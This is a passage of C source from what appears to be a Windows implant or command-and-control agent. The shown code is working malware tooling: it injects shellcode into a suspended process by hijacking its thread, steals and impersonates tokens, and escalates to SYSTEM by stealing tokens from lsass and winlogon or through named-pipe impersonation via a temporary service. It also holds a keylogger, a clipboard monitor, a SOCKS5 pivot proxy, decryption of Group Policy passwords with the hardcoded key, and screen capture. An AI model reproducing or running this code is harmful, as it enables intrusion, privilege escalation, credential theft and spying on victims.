        if (GetFileAttributesA(proc_path) == INVALID_FILE_ATTRIBUTES)
            snprintf(proc_path, MAX_PATH, "%s\\svchost.exe", sys);
    }
    WCHAR proc_w[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, proc_path, -1, proc_w, MAX_PATH);

    /* Pipe to capture stdout/stderr of the Donut-hosted assembly. */
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE out_rd = INVALID_HANDLE_VALUE, out_wr = INVALID_HANDLE_VALUE;
    BOOL piped = CreatePipe(&out_rd, &out_wr, &sa, 0);
    if (piped) SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = 0;
    if (piped) {
        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdInput  = NULL;
        si.hStdOutput = out_wr;
        si.hStdError  = out_wr;
    }

    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
    if (!CreateProcessW(NULL, proc_w, NULL, NULL, piped ? TRUE : FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        if (piped) { CloseHandle(out_rd); CloseHandle(out_wr); }
        char *e = (char*)malloc(128);
        snprintf(e, 128, "CreateProcessW(%s) failed (err %lu)", proc_path, GetLastError());
        return e;
    }
    if (piped) CloseHandle(out_wr); /* parent closes write end so ReadFile sees EOF on child exit */

    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        if (piped) CloseHandle(out_rd);
        return _strdup("VirtualAllocEx failed");
    }
    SIZE_T wr;
    WriteProcessMemory(pi.hProcess, mem, sc, sc_len, &wr);
    DWORD old; VirtualProtectEx(pi.hProcess, mem, sc_len, PAGE_EXECUTE_READ, &old);
    CONTEXT ctx; memset(&ctx, 0, sizeof(ctx)); ctx.ContextFlags = CONTEXT_CONTROL;
    if (GetThreadContext(pi.hThread, &ctx)) { ctx.Rip = (DWORD64)mem; SetThreadContext(pi.hThread, &ctx); }
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);

    if (!piped) {
        /* Pipe setup failed — fire-and-forget fallback */
        CloseHandle(pi.hProcess);
        char *out = (char*)malloc(192);
        snprintf(out, 192, "[+] fork-run: %zu B shellcode in %s (PID=%lu)", sc_len, proc_path, (unsigned long)pi.dwProcessId);
        return out;
    }

    /* ── Drain output pipe with 60s timeout ─────────────────────────────── */
    char  *output  = NULL;
    size_t out_len = 0, out_cap = 0;
    BYTE   buf[8192];
    DWORD  deadline = GetTickCount() + 60000;

    while (GetTickCount() < deadline) {
        DWORD avail = 0;
        if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            DWORD nr = 0;
            ReadFile(out_rd, buf, min(avail, (DWORD)sizeof(buf)), &nr, NULL);
            if (nr > 0) {
                if (out_len + nr >= out_cap) {
                    out_cap = out_len + nr + 4096;
                    char *tmp = (char*)realloc(output, out_cap + 1);
                    if (!tmp) break;
                    output = tmp;
                }
                memcpy(output + out_len, buf, nr);
                out_len += nr;
            }
        } else {
            if (WaitForSingleObject(pi.hProcess, 50) != WAIT_TIMEOUT) {
                while (1) {
                    avail = 0;
                    if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL) || avail == 0) break;
                    DWORD nr = 0;
                    ReadFile(out_rd, buf, min(avail, (DWORD)sizeof(buf)), &nr, NULL);
                    if (nr == 0) break;
                    if (out_len + nr >= out_cap) {
                        out_cap = out_len + nr + 4096;
                        char *tmp = (char*)realloc(output, out_cap + 1);
                        if (!tmp) break;
                        output = tmp;
                    }
                    memcpy(output + out_len, buf, nr);
                    out_len += nr;
                }
                break;
            }
        }
    }
    CloseHandle(out_rd);

    int timed_out = (GetTickCount() >= deadline);
    if (timed_out) TerminateProcess(pi.hProcess, 1);
    WaitForSingleObject(pi.hProcess, 5000);

    const char *marker = timed_out ? "\n[!] fork-run: timed out (60s)" : NULL;
    if (marker) {
        size_t mlen = strlen(marker);
        if (out_len + mlen >= out_cap) {
            out_cap = out_len + mlen + 1;
            char *tmp = (char*)realloc(output, out_cap + 1);
            if (tmp) output = tmp; else marker = NULL;
        }
        if (marker && output) { memcpy(output + out_len, marker, mlen); out_len += mlen; }
    }
    CloseHandle(pi.hProcess);

    if (!output || out_len == 0) { free(output); return _strdup("(no output)"); }
    output[out_len] = '\0';
    return output;
}

// ── Token operations ──────────────────────────────────────────────────────────

static int enable_privilege(HANDLE hToken, const char *priv_name) {
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, priv_name, &luid)) return 0;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) return 0;
    return GetLastError() == ERROR_SUCCESS ? 1 : 0;
}

static char *token_steal(int pid) {
    HANDLE hSelf;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hSelf)) {
        enable_privilege(hSelf, "SeDebugPrivilege"); CloseHandle(hSelf);
    }
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE|TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        char *e=(char*)malloc(64); snprintf(e,64,"OpenProcessToken failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hProc);
    /* Impersonation token for ImpersonateLoggedOnUser */
    HANDLE hDup;
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hTok);
        char *e=(char*)malloc(64); snprintf(e,64,"DuplicateTokenEx failed (err %lu)",GetLastError()); return e;
    }
    /* Primary token for CreateProcessWithTokenW in run_shell */
    HANDLE hPrim = NULL;
    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
    CloseHandle(hTok);
    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup); if (hPrim) CloseHandle(hPrim);
        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hDup);
    HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_stolen_token, hPrim);
    if (old) CloseHandle(old);
    char *out=(char*)malloc(64); snprintf(out,64,"[+] impersonating token from PID %d",pid); return out;
}

static char *token_make(const char *user, const char *domain, const char *pass) {
    WCHAR wu[256], wd[256], wp[256];
    MultiByteToWideChar(CP_UTF8,0,user,-1,wu,256);
    MultiByteToWideChar(CP_UTF8,0,domain,-1,wd,256);
    MultiByteToWideChar(CP_UTF8,0,pass,-1,wp,256);
    HANDLE hTok;
    if (!LogonUserW(wu, wd, wp, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTok)) {
        char *e=(char*)malloc(64); snprintf(e,64,"LogonUser failed (err %lu)",GetLastError()); return e;
    }
    if (!ImpersonateLoggedOnUser(hTok)) {
        CloseHandle(hTok);
        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed (err %lu)",GetLastError()); return e;
    }
    /* Store primary token for run_shell */
    HANDLE hPrim = NULL;
    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
    CloseHandle(hTok);
    HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_stolen_token, hPrim);
    if (old) CloseHandle(old);
    char *out=(char*)malloc(256); snprintf(out,256,"[+] impersonating %s\\%s",domain,user); return out;
}

/* Try to steal a primary+impersonation SYSTEM token from pid.
 * Returns malloc'd "[+] T1 SYSTEM ..." on success, NULL on any failure. */
static char *gs_try_steal(DWORD pid, const char *name) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;
    HANDLE hTok = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        return NULL;
    }
    CloseHandle(hProc);
    HANDLE hPrim = NULL, hDup = NULL;
    /* A delegation-level duplicate is what the mature token-launch paths
       try first; older/filtered tokens may only permit impersonation. */
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                          SecurityDelegation, TokenPrimary, &hPrim)) {
        DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                         SecurityImpersonation, TokenPrimary, &hPrim);
    }
    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenImpersonation, &hDup);
    CloseHandle(hTok);
    if (!hPrim || !hDup) {
        if (hPrim) CloseHandle(hPrim);
        if (hDup)  CloseHandle(hDup);
        return NULL;
    }
    if (!ImpersonateLoggedOnUser(hDup)) { CloseHandle(hDup); if (hPrim) CloseHandle(hPrim); return NULL; }
    CloseHandle(hDup);
    /* Normalise the token's session to our own session so that cmd.exe can
       initialise user32.dll.  A cross-session token (e.g. winlogon = Session 1
       while the agent runs in Session 0) causes STATUS_DLL_INIT_FAILED.
       Thread is now impersonating SYSTEM → SeTcbPrivilege is available. */
    DWORD cur_session = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &cur_session);
    SetTokenInformation(hPrim, TokenSessionId, &cur_session, sizeof(DWORD));
    HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
    if (old) CloseHandle(old);
    char *out = (char*)malloc(128);
    if (out) snprintf(out, 128, "[+] T1 SYSTEM (%s PID=%lu)", name, (unsigned long)pid);
    return out ? out : strdup("[+] T1 SYSTEM");
}

static char *get_system(void) {
    /* ── T1: SeDebugPrivilege + token steal (winlogon → lsass → services → wininit) */
    HANDLE hSelf = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hSelf)) {
        enable_privilege(hSelf, "SeDebugPrivilege"); CloseHandle(hSelf);
    }
    static const char *SYS_PROCS[] = {"winlogon.exe","lsass.exe","services.exe","wininit.exe",NULL};
    {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
            if (Process32First(snap, &pe)) {
                do {
                    for (int i = 0; SYS_PROCS[i]; i++) {
                        if (_stricmp(pe.szExeFile, SYS_PROCS[i]) == 0) {
                            char *r = gs_try_steal(pe.th32ProcessID, SYS_PROCS[i]);
                            if (r) { CloseHandle(snap); return r; }
                        }
                    }
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    }

    /* ── T2: Named pipe impersonation via service ── */
    DWORD rnd = GetTickCount() ^ (GetCurrentProcessId() << 4);
    char pipeName[64]; snprintf(pipeName, sizeof(pipeName), "\\\\.\\pipe\\svc%08lx", (unsigned long)rnd);
    char svcName[32];  snprintf(svcName,  sizeof(svcName),  "svc%08lx", (unsigned long)(rnd ^ 0xdeadbeefUL));
    char binPath[256]; snprintf(binPath,  sizeof(binPath),  "cmd.exe /c echo . > %s", pipeName);
    wchar_t wpipe[64], wsvc[32], wbin[256];
    MultiByteToWideChar(CP_ACP, 0, pipeName, -1, wpipe, 64);
    MultiByteToWideChar(CP_ACP, 0, svcName,  -1, wsvc,  32);
    MultiByteToWideChar(CP_ACP, 0, binPath,  -1, wbin,  256);

    HANDLE hPipe = CreateNamedPipeW(wpipe,
        0x00000003UL | 0x40000000UL, /* PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED */
        0x00000000UL,                /* PIPE_TYPE_BYTE | PIPE_WAIT */
        1, 512, 512, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        char *e = (char*)malloc(96);
        snprintf(e, 96, "[-] T1+T2 failed (CreateNamedPipe err %lu)", GetLastError());
        return e;
    }

    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, 0xF003FUL /* SC_MANAGER_ALL_ACCESS */);
    if (!hScm) {
        CloseHandle(hPipe);
        char *e = (char*)malloc(96);
        snprintf(e, 96, "[-] T1+T2 failed (OpenSCManager err %lu, need local admin)", GetLastError());
        return e;
    }

    SC_HANDLE hSvc = CreateServiceW(hScm, wsvc, wsvc, SERVICE_ALL_ACCESS,
        0x00000010UL, /* SERVICE_WIN32_OWN_PROCESS */
        0x00000003UL, /* SERVICE_DEMAND_START */
        0x00000000UL, /* SERVICE_ERROR_IGNORE */
        wbin, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        CloseServiceHandle(hScm); CloseHandle(hPipe);
        char *e = (char*)malloc(96);
        snprintf(e, 96, "[-] T1+T2 failed (CreateService err %lu)", GetLastError());
        return e;
    }

    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!hEvent) {
        DeleteService(hSvc); CloseServiceHandle(hSvc); CloseServiceHandle(hScm); CloseHandle(hPipe);
        return strdup("[-] T1+T2 failed (CreateEvent)");
    }

    OVERLAPPED ov; memset(&ov, 0, sizeof(ov)); ov.hEvent = hEvent;
    ConnectNamedPipe(hPipe, &ov); /* async — returns ERROR_IO_PENDING */
    StartServiceW(hSvc, 0, NULL);

    /* Fast path: most services connect within 2s.
     * If not, retry StartService once and wait 3s more (total ≤ 5s). */
    DWORD wr = WaitForSingleObject(hEvent, 2000);
    if (wr != WAIT_OBJECT_0) {
        StartServiceW(hSvc, 0, NULL);
        wr = WaitForSingleObject(hEvent, 3000);
    }
    DeleteService(hSvc); CloseServiceHandle(hSvc); CloseServiceHandle(hScm); CloseHandle(hEvent);

    if (wr != WAIT_OBJECT_0) {
        CancelIoEx(hPipe, &ov); CloseHandle(hPipe);
        char *e = (char*)malloc(96);
        snprintf(e, 96, "[-] T1+T2 failed (T2 pipe timeout res=%lu)", wr);
        return e;
    }

    BOOL ok2 = ImpersonateNamedPipeClient(hPipe);
    CloseHandle(hPipe);
    if (!ok2) {
        char *e = (char*)malloc(96);
        snprintf(e, 96, "[-] T1+T2 failed (ImpersonateNamedPipeClient err %lu)", GetLastError());
        return e;
    }
    {
        HANDLE hThr = NULL, hPrim = NULL;
        if (OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_ALL_ACCESS, FALSE, &hThr)) {
            if (!DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, NULL,
                                  SecurityDelegation, TokenPrimary, &hPrim)) {
                DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, NULL,
                                 SecurityImpersonation, TokenPrimary, &hPrim);
            }
            CloseHandle(hThr);
        }
        if (!hPrim) {
            DWORD err = GetLastError();
            RevertToSelf();
            char *e = (char*)malloc(96);
            snprintf(e, 96, "[-] T1+T2 failed (DuplicateTokenEx err %lu)", err);
            return e;
        }
        /* Same session normalisation as T1: thread is SYSTEM via
           ImpersonateNamedPipeClient → SeTcbPrivilege is available. */
        DWORD cur_session = 0;
        ProcessIdToSessionId(GetCurrentProcessId(), &cur_session);
        SetTokenInformation(hPrim, TokenSessionId, &cur_session, sizeof(DWORD));
        HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
        if (old) CloseHandle(old);
    }
    return strdup("[+] T2 SYSTEM (named pipe + service)");
}

// ── Token store globals ───────────────────────────────────────────────────────

typedef struct { int id; DWORD pid; char user[128]; HANDLE token; } TokenEntry;
static TokenEntry g_tokens[32];
static int  g_token_count   = 0;
static int  g_token_next_id = 1;

// ── Interactive shell globals ─────────────────────────────────────────────────

static HANDLE g_ishell_proc     = NULL;
static HANDLE g_ishell_stdin_w  = NULL;
static HANDLE g_ishell_stdout_r = NULL;

// ── Keylogger globals + hook proc + thread ────────────────────────────────────

static char         g_keylog_buf[65536];
static int          g_keylog_len    = 0;
static HHOOK        g_keyhook       = NULL;
static HANDLE       g_keylog_thread = NULL;
static volatile int g_keylog_stop   = 1;
static DWORD        g_keylog_tid    = 0;

static LRESULT CALLBACK KeyHookProc(int n, WPARAM w, LPARAM l) {
    if (n >= 0 && (w == 0x100 /*WM_KEYDOWN*/ || w == 0x104 /*WM_SYSKEYDOWN*/)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)l;
        WCHAR wch[8] = {0};
        BYTE  ks[256] = {0};
        GetKeyboardState(ks);
        int r = ToUnicode(kb->vkCode, kb->scanCode, ks, wch, 8, 0);
        if (r > 0) {
            for (int ki = 0; ki < r && g_keylog_len < (int)sizeof(g_keylog_buf)-2; ki++) {
                if (wch[ki] < 0x80)
                    g_keylog_buf[g_keylog_len++] = (char)wch[ki];
                else
                    g_keylog_buf[g_keylog_len++] = '?';
            }
        }
    }
    return CallNextHookEx(g_keyhook, n, w, l);
}

static DWORD WINAPI KeylogThread(LPVOID p) {
    (void)p;
    g_keylog_stop = 0;
    g_keyhook = SetWindowsHookExW(13 /*WH_KEYBOARD_LL*/, KeyHookProc, NULL, 0);
    MSG msg;
    while (!g_keylog_stop) {
        int r = GetMessageW(&msg, NULL, 0, 0);
        if (r == 0 || r == -1) break;
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_keyhook) { UnhookWindowsHookEx(g_keyhook); g_keyhook = NULL; }
    g_keylog_stop = 1;
    return 0;
}

// ── Clipboard monitor globals + thread ───────────────────────────────────────

static char         g_clip_buf[65536];
static int          g_clip_len    = 0;
static HANDLE       g_clip_thread = NULL;
static volatile int g_clip_stop   = 1;
static int          g_clip_interval = 5; /* seconds */

static DWORD WINAPI ClipMonThread(LPVOID p) {
    (void)p;
    g_clip_stop = 0;
    char last[4096] = {0};
    while (!g_clip_stop) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                const char *text = (const char*)GlobalLock(hData);
                if (text && strcmp(text, last) != 0) {
                    /* new clipboard content */
                    char entry[512];
                    int n = snprintf(entry, sizeof(entry), "[clip] %.*s\n", 400, text);
                    if (g_clip_len + n < (int)sizeof(g_clip_buf) - 1) {
                        memcpy(g_clip_buf + g_clip_len, entry, n);
                        g_clip_len += n;
                        g_clip_buf[g_clip_len] = '\0';
                    }
                    strncpy(last, text, sizeof(last)-1);
                }
                GlobalUnlock(hData);
            }
            CloseClipboard();
        }
        for (int i = 0; i < g_clip_interval * 10 && !g_clip_stop; i++)
            Sleep(100);
    }
    g_clip_stop = 1;
    return 0;
}

// ── File search ───────────────────────────────────────────────────────────────

static int g_search_count = 0;
static char g_search_results[65536];
static int  g_search_rlen = 0;

static void search_dir(const char *dir, const char *pattern, int max_results) {
    if (g_search_count >= max_results) return;
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        char full[MAX_PATH];
        snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            search_dir(full, pattern, max_results);
        } else {
            /* simple glob: if pattern has no path sep, match just the filename */
            int match = 0;
            if (strchr(pattern, '*') || strchr(pattern, '?')) {
                /* use PathMatchSpecA if available, else substring check */
                HMODULE sh = GetModuleHandleA("shlwapi.dll");
                if (!sh) sh = LoadLibraryA("shlwapi.dll");
                if (sh) {
                    typedef BOOL (WINAPI *pfnPMS)(LPCSTR, LPCSTR);
                    pfnPMS fn = (pfnPMS)GetProcAddress(sh, "PathMatchSpecA");
                    if (fn) match = fn(fd.cFileName, pattern);
                }
                if (!match) {
                    /* fallback: simple case-insensitive strstr */
                    char lc_name[MAX_PATH], lc_pat[MAX_PATH];
                    strncpy(lc_name, fd.cFileName, sizeof(lc_name)-1);
                    strncpy(lc_pat, pattern, sizeof(lc_pat)-1);
                    for (char *q=lc_name;*q;q++) *q=(char)tolower((unsigned char)*q);
                    for (char *q=lc_pat;*q;q++) *q=(char)tolower((unsigned char)*q);
                    /* strip leading * for substring match */
                    const char *pat2 = lc_pat;
                    while (*pat2 == '*') pat2++;
                    const char *p2 = pat2;
                    while (*p2 == '*' || *p2 == '?') p2++;
                    if (*p2 == '\0') match = 1; /* all wildcards — match everything */
                    else match = (strstr(lc_name, pat2) != NULL);
                }
            } else {
                /* exact match */
                match = (_stricmp(fd.cFileName, pattern) == 0);
            }
            if (match && g_search_count < max_results) {
                int n = (int)strlen(full);
                if (g_search_rlen + n + 2 < (int)sizeof(g_search_results)) {
                    memcpy(g_search_results + g_search_rlen, full, n);
                    g_search_rlen += n;
                    g_search_results[g_search_rlen++] = '\n';
                    g_search_results[g_search_rlen]   = '\0';
                }
                g_search_count++;
            }
        }
    } while (FindNextFileA(hFind, &fd) && g_search_count < max_results);
    FindClose(hFind);
}

// ── SOCKS5 globals + relay + listener ────────────────────────────────────────

static SOCKET       g_socks_listen = INVALID_SOCKET;
static HANDLE       g_socks_thread = NULL;
static volatile int g_socks_stop   = 1;

typedef struct { SOCKET src; SOCKET dst; } RelayArg;

static DWORD WINAPI SocksRelayThread(LPVOID p) {
    RelayArg *ra = (RelayArg*)p;
    char buf[4096];
    int  n;
    while ((n = recv(ra->src, buf, sizeof(buf), 0)) > 0)
        send(ra->dst, buf, n, 0);
    shutdown(ra->dst, SD_BOTH);
    free(ra);
    return 0;
}

static void socks5_handle_client(SOCKET client) {
    unsigned char hdr[260] = {0};
    char host[256] = {0};
    int  port = 0;
    int  connected = 0;
    SOCKET target = INVALID_SOCKET;

    do {
        /* Greeting */
        if (recv(client, (char*)hdr, 2, MSG_WAITALL) < 2 || hdr[0] != 5) break;
        { int nm = hdr[1]; if (nm > 0) recv(client,(char*)hdr+2,nm,MSG_WAITALL); }
        { unsigned char na[2]={5,0}; send(client,(char*)na,2,0); }

        /* Request header */
        if (recv(client,(char*)hdr,4,MSG_WAITALL) < 4 || hdr[0]!=5 || hdr[1]!=1) {
            unsigned char f[10]={5,7,0,1,0,0,0,0,0,0}; send(client,(char*)f,10,0); break;
        }
        if (hdr[3] == 1) { /* IPv4 */
            unsigned char ip[4]={0}; recv(client,(char*)ip,4,MSG_WAITALL);
            snprintf(host,sizeof(host),"%d.%d.%d.%d",ip[0],ip[1],ip[2],ip[3]);
        } else if (hdr[3] == 3) { /* Domain */
            unsigned char dl=0; recv(client,(char*)&dl,1,MSG_WAITALL);
            if (dl > 0 && dl < (unsigned char)sizeof(host)-1) {
                recv(client,host,dl,MSG_WAITALL); host[(unsigned)dl]='\0';
            }
        } else {
            unsigned char f[10]={5,8,0,1,0,0,0,0,0,0}; send(client,(char*)f,10,0); break;
        }
        { unsigned char pb[2]={0}; recv(client,(char*)pb,2,MSG_WAITALL);
          port=(pb[0]<<8)|pb[1]; }

        /* Connect to target */
        char ps[8]; snprintf(ps,sizeof(ps),"%d",port);
        struct addrinfo hints2,*res2=NULL;
        memset(&hints2,0,sizeof(hints2));
        hints2.ai_family=AF_UNSPEC; hints2.ai_socktype=SOCK_STREAM;
        if (getaddrinfo(host,ps,&hints2,&res2)==0 && res2) {
            target = socket(res2->ai_family,SOCK_STREAM,0);
            if (target!=INVALID_SOCKET &&
                connect(target,res2->ai_addr,(int)res2->ai_addrlen)!=0) {
                closesocket(target); target=INVALID_SOCKET;
            }
            freeaddrinfo(res2);
        }
        if (target==INVALID_SOCKET) {
            unsigned char f[10]={5,5,0,1,0,0,0,0,0,0}; send(client,(char*)f,10,0); break;
        }
        { unsigned char ok[10]={5,0,0,1,0,0,0,0,0,0}; send(client,(char*)ok,10,0); }
        connected = 1;
    } while (0);

    if (connected) {
        RelayArg *a1 = (RelayArg*)malloc(sizeof(RelayArg));
        RelayArg *a2 = (RelayArg*)malloc(sizeof(RelayArg));
        if (a1 && a2) {
            a1->src=client; a1->dst=target;
            a2->src=target; a2->dst=client;
            HANDLE t1 = CreateThread(NULL,0,SocksRelayThread,a1,0,NULL);
            HANDLE t2 = CreateThread(NULL,0,SocksRelayThread,a2,0,NULL);
            if (t1 && t2) { HANDLE th[2]={t1,t2}; WaitForMultipleObjects(2,th,TRUE,INFINITE); }
            else if (t1) WaitForSingleObject(t1,INFINITE);
            else if (t2) WaitForSingleObject(t2,INFINITE);
            if (t1) CloseHandle(t1);
            if (t2) CloseHandle(t2);
        } else { free(a1); free(a2); }
        closesocket(target);
    }
    closesocket(client);
}

static DWORD WINAPI SocksClientThread(LPVOID p) {
    socks5_handle_client((SOCKET)(UINT_PTR)p);
    return 0;
}

static DWORD WINAPI SocksListenThread(LPVOID p) {
    (void)p;
    while (!g_socks_stop) {
        SOCKET cl = accept(g_socks_listen,NULL,NULL);
        if (cl==INVALID_SOCKET) break;
        HANDLE ht = CreateThread(NULL,0,SocksClientThread,(LPVOID)(UINT_PTR)cl,0,NULL);
        if (ht) CloseHandle(ht); else closesocket(cl);
    }
    return 0;
}

// ── GPP password decryption (AES-256-CBC, BCrypt CNG) ────────────────────────

static char* gpp_decrypt_cpassword(const char *b64val) {
    size_t ct_len = 0;
    uint8_t *ct = b64_decode(b64val, &ct_len);
    if (!ct || ct_len == 0) { free(ct); return strdup("(b64 decode failed)"); }

    static const uint8_t GPP_KEY[32] = {
        0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
        0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
        0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
        0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
    };
    uint8_t iv[16] = {0};

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    char *result = NULL;

    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg,BCRYPT_AES_ALGORITHM,NULL,0))) goto gpp_done;
    if (!NT_SUCCESS(BCryptSetProperty(hAlg,BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_CBC,sizeof(BCRYPT_CHAIN_MODE_CBC),0))) goto gpp_done;
    if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAlg,&hKey,NULL,0,
            (PUCHAR)GPP_KEY,32,0))) goto gpp_done;

    {
        ULONG result_len = 0;
        uint8_t *plain = (uint8_t*)malloc(ct_len+16);
        if (!plain) goto gpp_done;
        NTSTATUS gst = BCryptDecrypt(hKey,ct,(ULONG)ct_len,NULL,
                                     iv,16,plain,(ULONG)ct_len,&result_len,
                                     BCRYPT_BLOCK_PADDING);
        if (NT_SUCCESS(gst)) {
            plain[result_len] = '\0';
            result = strdup((char*)plain);
        } else {
            char e[64]; snprintf(e,sizeof(e),"(decrypt err 0x%lx)",(unsigned long)gst);
            result = strdup(e);
        }
        free(plain);
    }
gpp_done:
    if (!result) result = strdup("(bcrypt init failed)");
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg,0);
    free(ct);
    return result;
}

// ── Screenwatch thread ─────────────────────────────────────────────────────────
static uint8_t *sw_capture(DWORD *out_sz) {
    *out_sz = 0;
    /* No desktop/winstation switch here — GDI calls from a background thread
     * must not call SetProcessWindowStation (process-wide) or SetThreadDesktop
     * (which can fail on a thread that already has a desktop association).
     * Instead we write the BMP to a temp file from the main capture thread and
     * read it back here. Use a shared temp path guarded by the transport lock. */
    HDC hDC = GetDC(NULL);
    if (!hDC) return NULL;
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    if (w <= 0 || h <= 0) { ReleaseDC(NULL, hDC); return NULL; }
    HDC hMem = CreateCompatibleDC(hDC);
    if (!hMem) { ReleaseDC(NULL, hDC); return NULL; }
    HBITMAP hBmp = CreateCompatibleBitmap(hDC, w, h);
    if (!hBmp) { DeleteDC(hMem); ReleaseDC(NULL, hDC); return NULL; }
    HGDIOBJ hOld = SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hDC, 0, 0, SRCCOPY);
    SelectObject(hMem, hOld);
    BITMAPINFOHEADER bi = {0}; bi.biSize=sizeof(bi); bi.biWidth=w; bi.biHeight=-h;
    bi.biPlanes=1; bi.biBitCount=24; bi.biCompression=BI_RGB;
    int row_sz = (w*3+3)&~3; DWORD data_sz = (DWORD)((size_t)row_sz*(size_t)h);
    uint8_t *pixels = (uint8_t*)malloc(data_sz);
    uint8_t *result = NULL;
    if (pixels) {
        GetDIBits(hMem, hBmp, 0, (UINT)h, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        int ab=1; for(DWORD _i=0;_i<data_sz&&ab;_i++) if(pixels[_i]) ab=0;
        if (!ab) {
            BITMAPFILEHEADER bfh={0}; bfh.bfType=0x4D42;
            bfh.bfSize=(DWORD)(sizeof(bfh)+sizeof(bi)+data_sz); bfh.bfOffBits=(DWORD)(sizeof(bfh)+sizeof(bi));
            DWORD total=sizeof(bfh)+sizeof(bi)+data_sz; result=(uint8_t*)malloc(total);
